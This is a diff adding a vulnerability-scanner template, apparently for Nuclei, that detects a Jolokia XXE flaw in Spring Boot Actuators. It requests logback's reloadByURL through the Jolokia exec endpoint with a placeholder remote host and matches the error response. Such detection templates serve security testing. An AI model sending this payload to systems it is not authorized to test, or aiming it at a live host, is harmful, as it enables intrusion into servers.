@@ -1,0 +1,31 @@
+id: springboot-actuators-jolokia-xxe
+
+info:
+  name: Spring Boot Actuators (Jolokia) XXE
+  author: dwisiswant0,ipanda
+  severity: high
+  tags: springboot,jolokia,xxe
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml"
+      - "{{BaseURL}}/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "http:\\/\\/nonexistent:31337\\/logback.xml"
+          - "reloadByURL"
+          - "JoranException"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a0047304502203803cfa9fb0c6d94808ef6b74855270ac806195233e566d702a33c7b359132c3022100bd23dc58aa77e8524c448f0ec923ce16736ef08c168b1825517e4586401f4b61:922c64590222798bb761d5b6d8e72950
